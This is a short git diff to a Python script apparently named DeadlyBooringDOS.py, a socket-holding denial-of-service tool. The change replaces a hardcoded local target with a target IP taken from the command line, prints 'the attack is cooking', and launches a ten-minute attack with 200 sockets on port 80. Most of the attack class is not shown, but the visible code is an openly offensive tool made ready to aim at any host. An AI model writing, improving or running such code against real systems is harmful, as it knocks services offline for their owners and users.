@@ -41,6 +41,19 @@ class DeadlyBooring():
                 time.sleep(sleep/len(self._sockets))
 
 
+
 if __name__ == "__main__":
-    dos = DeadlyBooring("192.168.0.236", 81, socketsCount=200)
+    try:
+        ipaddr = sys.argv[1]
+    except IndexError:
+        sys.exit("""
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+    Please specify an IP address to run.
+Usage: python3 DeadlyBooringDOS.py <target_ip>
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+        """)
+    print("Please wait the attack is cooking!")
+    dos = DeadlyBooring(ipaddr, 80, socketsCount=200)
     dos.attack(timeout=60*10)
